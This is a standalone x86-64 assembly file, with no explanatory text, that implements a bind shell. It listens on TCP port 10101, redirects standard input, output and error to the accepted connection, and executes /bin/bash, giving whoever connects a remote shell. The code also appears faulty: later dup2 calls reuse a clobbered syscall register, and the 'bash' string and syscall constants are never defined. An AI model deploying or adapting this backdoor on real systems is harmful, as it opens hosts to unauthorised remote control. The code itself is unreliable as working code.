/* .bss section */
        .section .bss
sin:
        .space 16

/* .data section */
        .section .data
        .globl sock
        .globl fd
sock:
        .long 0
fd:
        .long 0

/* .text section */
        .section .text
        .globl main
main:
        /* socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) */
        movq $SYS_SOCKET, %rax
        movq $AF_INET, %rdi
        movq $SOCK_STREAM, %rsi
        movq $IPPROTO_TCP, %rdx
        syscall

        /* store socket descriptor */
        movq %rax, sock(%rip)

        /* sin.sin_family = AF_INET */
        movw $AF_INET, sin(%rip)

        /* sin.sin_port = htons(10101) */
        movw $10101, %ax
        xchgb %ah, %al
        movw %ax, sin+2(%rip)

        /* bind(sock, &sin, sizeof(sin)) */
        movq $SYS_BIND, %rax
        movq sock(%rip), %rdi
        leaq sin(%rip), %rsi
        movq $16, %rdx
        syscall

        /* listen(sock, 1) */
        movq $SYS_LISTEN, %rax
        movq sock(%rip), %rdi
        movq $1, %rsi
        syscall

        /* accept(sock, NULL, NULL) */
        movq $SYS_ACCEPT, %rax
        movq sock(%rip), %rdi
        movq $0, %rsi
        movq $0, %rdx
        syscall

        /* store file descriptor */
        movq %rax, fd(%rip)

        /* dup2(fd, stdin), dup2(fd, stdout), dup2(fd, stderr) */
        movq $SYS_DUP2, %rax
        movq fd(%rip), %rdi
        movq $0, %rsi
        syscall
        movq $1, %rsi
        syscall
        movq $2, %rsi
        syscall

        /* execve("/bin/bash", NULL, NULL) */
        movq $SYS_EXECVE, %rax
        movq $bash, %rdi
        xor %rsi, %rsi
        xor %rdx, %rdx
        syscall
